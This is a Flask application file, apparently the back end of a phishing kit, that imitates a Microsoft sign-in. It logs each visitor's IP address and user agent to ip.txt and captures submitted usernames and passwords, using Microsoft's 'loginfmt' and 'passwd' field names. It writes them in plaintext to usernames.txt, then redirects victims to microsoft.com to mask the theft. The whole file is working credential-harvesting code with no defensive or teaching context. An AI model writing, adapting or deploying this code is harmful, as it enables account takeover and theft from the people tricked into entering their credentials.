# app.py
from flask import Flask, render_template, request, redirect, url_for, session
import os
from datetime import datetime

app = Flask(__name__, static_folder='static')


@app.route('/')
def index():
    ip_address = get_ip_address(request)
    user_agent = request.headers.get('User-Agent')

    log_visitor(ip_address, user_agent)

    return redirect(url_for('login'))

@app.route('/login.html')
def login():
    return render_template('login.html')

@app.route('/login.php', methods=['POST'])
def process_login():
    username = request.form.get('loginfmt', '')
    password = request.form.get('passwd', '')

    log_credentials(username, password)

    return redirect('https://microsoft.com')

def get_ip_address(request):
    """Extract IP address from request headers similar to the PHP implementation"""
    if request.headers.get('HTTP_CLIENT_IP'):
        ip = request.headers.get('HTTP_CLIENT_IP')
    elif request.headers.get('HTTP_X_FORWARDED_FOR'):
        ip = request.headers.get('HTTP_X_FORWARDED_FOR')
    else:
        ip = request.remote_addr
    return ip

def log_visitor(ip, user_agent):
    """Log visitor information to ip.txt"""
    with open('ip.txt', 'a') as f:
        f.write(f"IP: {ip}\n User-Agent: {user_agent}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write("-" * 50 + "\n")

def log_credentials(username, password):
    """Log credentials to usernames.txt"""
    with open('usernames.txt', 'a') as f:
        f.write(f"Account: {username} Pass: {password}\n")

if __name__ == '__main__':
    app.run(debug=True)